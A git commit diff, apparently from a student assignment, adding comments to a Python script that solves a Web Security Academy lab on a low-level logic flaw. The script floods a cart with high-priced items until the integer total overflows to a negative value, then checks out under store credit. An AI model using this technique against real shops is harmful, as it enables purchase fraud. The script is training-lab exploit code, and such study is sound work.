3629eb0e8bd53136f46e733f6bdc3e1563e936cb
Manuel <manumcrfan@gmail.com>
2022-12-13 10:17:58 +0100

    final version with comments of assignment first script

--- low-level_logic_flaw.py
+++ low-level_logic_flaw.py
@@ -4,27 +4,27 @@ from lxml import html
 from rich.console import Console
 from rich.table import Table
 from collections import namedtuple
-import aiohttp
-import asyncio
 
 console = Console()
 
-STORE_CREDIT = 100
-JACKET_PRODUCT_ID = 1
-SERVER = 'https://'
+STORE_CREDIT = 100 #dollars available in our wallet
+JACKET_PRODUCT_ID = 1 #leather jacket ID
+SERVER = 'https://' #Server URL to compose
 INT_MAX = 2147483647 #couldn't set maxint constraint because it's not supported anymore by the newest python interpreters
-JACKET_PRICE_IN_CENTS = 133700
-MAX_QTY_PER_REQUEST = 99
+JACKET_PRICE_IN_CENTS = 133700 #price of a single leather jacket, the object we want to buy 
+MAX_QTY_PER_REQUEST = 99 #max quantity a user can buy in one time 
 
 Product = namedtuple("Product", "name price id")
 
-def fetch_csrf_token(session, endpoint):
+#utility method to fetch csrf tokens when required
+def fetch_csrf_token(session, endpoint): 
     response = session.get(f"{SERVER}/{endpoint}")
     console.log(f"Status code for csrf token request= {response.status_code}")
     html_document = html.fromstring(response.content)
     csrf_token = html_document.xpath("//input[@name='csrf']/@value")[0]
     return csrf_token
 
+#checkout method at the end of our attack
 def checkout(session):
     csrf_token = fetch_csrf_token(session,'cart')
     response = session.post(f"{SERVER}/cart/checkout", data={
@@ -33,12 +33,14 @@ def checkout(session):
     console.log(f"Status code for checkout request= {response.status_code}")
     return response
 
+#parsing all products with their names, prices and ids to be inserted into the table 
 def parse_product(product):
     product_name = product.xpath('h3')[0].text
     product_price = float(product.xpath('img')[1].tail.strip().replace("$",""))
     product_id = product.xpath("a[@class='button']/@href")[0].split('=')[1]
     return Product(product_name, product_price, product_id)
 
+#login method to access profile and be able to add products to cart
 def login(session):
     response = session.get(f'{SERVER}/login')
     console.log(f'Status code {response.status_code}')
@@ -53,6 +55,7 @@ def login(session):
     if (response.status_code == 200):
         console.log('Login successful')
 
+#fetches all products available on the site 
 def fetch_products(session):
     res = []
     
@@ -63,6 +66,7 @@ def fetch_products(session):
     res += [parse_product(product) for product in products]
     return res
 
+#utility method to add a single product with its own qty 
 def add_prod_to_cart(session,id,quantity):
     response = session.post(f'{SERVER}/cart', data = {
             "productId": id,
@@ -71,6 +75,7 @@ def add_prod_to_cart(session,id,quantity):
         })
     console.log(f"Status code for adding {quantity} pieces of product {id} to the cart request= {response.status_code}")
 
+#utility method to retrieve the total amount to pay
 def fetch_total(session):
     response = session.get(f'{SERVER}/cart')
     console.log(f'Status code for fetching total amount to pay request= {response.status_code}')
@@ -79,6 +84,7 @@ def fetch_total(session):
     total_int=int(total.replace('$',''))
     return total_int
 
+#utility method to compose the table of products with all their data
 def products_table(products):
     table = Table(title="Products")
     table.add_column("Name")
@@ -89,7 +95,7 @@ def products_table(products):
         table.add_row(product.name, str(product.price), product.id)
     return table
 
-
+#retrieves the second most expensive product
 def second_most_expensive_prodId(products):
     price_max=0
     second_prod=()
@@ -101,34 +107,35 @@ def second_most_expensive_prodId(products):
 
     return second_prod
 
-
+#method that floods the cart with 99 jackets before and the remaining amount right after 
 def flood_the_cart(session,id):
-    times_to_add_jacket = int((INT_MAX*2)/(JACKET_PRICE_IN_CENTS))
+    times_to_add_jacket = int((INT_MAX*2)/(JACKET_PRICE_IN_CENTS)) #calculate how many times the price of a single jacket is contained in double the INT_MAX 
+    #(negative and positive portion)
 
-    times = int(times_to_add_jacket / MAX_QTY_PER_REQUEST)
+    times = int(times_to_add_jacket / MAX_QTY_PER_REQUEST) #the integer part of the division is the total times we must add 99 jackets to reach a negative amount 
 
-    remaining_qty = (times_to_add_jacket % MAX_QTY_PER_REQUEST)
+    remaining_qty = (times_to_add_jacket % MAX_QTY_PER_REQUEST) #the remainder is the total quantity we have to add in the end to reach the said amount 
 
     for i in range (0,times):
             add_prod_to_cart(session,id,MAX_QTY_PER_REQUEST)
     add_prod_to_cart(session,id,remaining_qty)
 
-    """with concurrent.futures.ThreadPoolExecutor(max_workers=99) as executor:
-        futures = [executor.submit(add_prod_to_cart(session,JACKET_PRODUCT_ID,MAX_QTY_PER_REQUEST))
-                       for i in range (0,times)]
-        for future in concurrent.futures.as_completed(futures):
-            print('wewe')"""
 
+#floods the cart with the second most expensive product under 100 dollars
 def flood_one_more_time(session, products, total_amount):
-    sec_prod = second_most_expensive_prodId(products)    
+    sec_prod = second_most_expensive_prodId(products)  #retrieve the second most expensive product
         
-    times_to_add_second_prod = int((-total_amount + STORE_CREDIT)/(sec_prod.price))
-    for i in range(0,times_to_add_second_prod):
+    times_to_add_second_prod = int((-total_amount + STORE_CREDIT)/(sec_prod.price)) #calculate the times the price of this product is contained in the range (-total_amount + STORE CREDIT) 
+    #the integer part of the division is the number of times we must add 1 piece of the second most expensive product to reach the intended amount
+    
+    for i in range(0,times_to_add_second_prod): 
         add_prod_to_cart(session,sec_prod.id,1)
 
+#composes the URL to connect to 
 def init_connection(sid):
     global SERVER
-    SERVER += (sid + '.web-security-academy.net')
+    url = sid + '.web-security-academy.net'
+    SERVER += url
 
 def main(sid:str):
 
